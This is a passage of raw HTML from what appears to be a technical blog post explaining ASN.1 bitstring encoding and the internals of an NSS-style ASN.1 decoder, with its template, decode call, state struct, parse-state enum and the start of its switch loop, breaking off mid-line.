class="c7"&gt;UNIVERSAL&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;string must be a multiple of 4 bytes in length, but that&amp;#39;s about it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;ASN.1 &lt;/span&gt;&lt;span class="c7"&gt;bitstrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;are strings of bits as opposed to bytes. You could for example have a bitstring with a length of a single bit (so either a &lt;/span&gt;&lt;span class="c7"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c7"&gt;1&lt;/span&gt;&lt;span class="c9"&gt;) or a bitstring with a length of 127 bits (so 15 full bytes plus an extra 7 bits.) &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;Encoded ASN.1 &lt;/span&gt;&lt;span class="c7"&gt;bitstrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;have an extra metadata byte after the length but before the contents, which encodes the number of unused &lt;/span&gt;&lt;span class="c17"&gt;bits&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;in the final byte.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLFuO8lb9EEiWHIAHNFcZQGqIWDtJ-V8DVI8GZC2Bc0d1qsrM3SugjE8dkb2z1IXa86wWlUiPJ4X0PquX_Vozl_6oJUNT9dU0LMgNh1x4L86-cjKpRuDpQdPRPbyp-Rmu0gbipzRY9XRmQz5q_7ZfmXW4MJ_6YcR735HO0YngIFvrYyjymoiwKYmP9RA/s1165/image1%20%282%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLFuO8lb9EEiWHIAHNFcZQGqIWDtJ-V8DVI8GZC2Bc0d1qsrM3SugjE8dkb2z1IXa86wWlUiPJ4X0PquX_Vozl_6oJUNT9dU0LMgNh1x4L86-cjKpRuDpQdPRPbyp-Rmu0gbipzRY9XRmQz5q_7ZfmXW4MJ_6YcR735HO0YngIFvrYyjymoiwKYmP9RA/s600/image1%20%282%29.png" border="0" alt="Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid." style="max-height: 750; max-width: 600;"title="Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c34 c8"&gt;&lt;span class="c27 c26"&gt;Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid.&lt;/span&gt;&lt;/p&gt; &lt;p class="c8 c14 c34"&gt;&lt;span class="c26 c27"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c32 c8" id="h.9dutmbj0iutz"&gt;&lt;span class="c31 c28"&gt;Parsing ASN.1&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;ASN.1 data always needs to be decoded in tandem with a template that tells the parser what data to expect and also provides output pointers to be filled in with the parsed output data. Here&amp;#39;s the template my test program uses to exercise the bitstring code:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e816d0e76cff75906d870663f8d39eaa14fc6487"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;const&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Template&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;simple_bitstring_template&lt;/span&gt;&lt;span class="c1"&gt;[]&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; SEC_ASN1_BIT_STRING &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SEC_ASN1_MAY_STREAM&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// kind: bit string,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// &amp;nbsp;may be constructed&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// offset: in dest/src&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; NULL&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;// sub: subtemplate for indirection&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// size: of output structure&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class="c7"&gt;SecASN1Item&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a very simple wrapper around a buffer. We can provide a &lt;/span&gt;&lt;span class="c7"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;for the parser to use to return the parsed bitstring then call the parser:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.800141608823d3e78f5e3937494968c764bff2e1"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;decoded &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c20"&gt;PLArenaPool&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;pool &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;PORT_NewArena&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c11"&gt;1024&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c20"&gt;SECStatus&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; SEC_ASN1Decode&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;pool&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// pool: arena for destination allocations&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;decoded&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// dest: decoded encoded items in to here&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;simple_bitstring_template&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// template&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;asn1_bytes&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;// buf: asn1 input bytes&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;asn1_bytes_len&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// len: input size&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class="c32 c8" id="h.ge5rhouvh4pm"&gt;&lt;span class="c28 c31"&gt;NSS ASN.1 state machine&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;The state machine has two core data structures:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c7"&gt;SEC_ASN1DecoderContext&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;- the overall parsing context&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c7"&gt;sec_asn1d_state&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;- a single parser state, kept in a doubly-linked list forming a stack of nested states&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;Here&amp;#39;s a trimmed version of the state object showing the relevant fields:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.6e6d0d518a15f071678c6483b9dc57daeed428e3"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;typedef&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_state_struct &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; SEC_ASN1DecoderContext &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;const&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Template&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;theTemplate&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;void&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_state_struct &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;parent&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;struct&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_state_struct &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;child&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; sec_asn1d_parse_place place&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;contents_length&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;pending&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;consumed&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;int&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;depth&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_state&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The main engine of the parsing state machine is the method &lt;/span&gt;&lt;span class="c7"&gt;SEC_ASN1DecoderUpdate&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which takes a context object, raw input buffer and length:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.ca1f754aaf2b9b2a69a0b772c008c3066c24eed5"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c20"&gt;SECStatus&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;SEC_ASN1DecoderUpdate &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;SEC_ASN1DecoderContext &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;cx&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;const&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The current state is stored in the context object&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;current&lt;/span&gt;&lt;span&gt;&amp;nbsp;field, and that current &lt;/span&gt;&lt;span class="c7"&gt;state&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;place&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field determines the current state which the parser is in. Those states are defined here:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.58b2c4a0a10300b6306e34913640a092d86c5d56"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;&amp;#8203;&amp;#8203;&lt;/span&gt;&lt;span class="c16"&gt;typedef&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;enum&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; beforeIdentifier&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringIdentifier&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterIdentifier&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; beforeLength&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringLength&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterLength&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringBitString&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringConstructedString&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringGroup&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringLeaf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringSaveEncoding&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringSequence&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterConstructedString&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterGroup&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterExplicit&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterImplicit&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterInline&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterPointer&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterSaveEncoding&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; beforeChoice&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; duringChoice&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; afterChoice&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; notInUse&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_parse_place&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The state machine loop switches on the &lt;/span&gt;&lt;span class="c7"&gt;place&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;field to determine which method to call:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.34b38de34f5f395cb1366034a4fd68d5d626ae2c"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;switch&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;case&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeIdentifier&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; consumed &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_parse_identifier 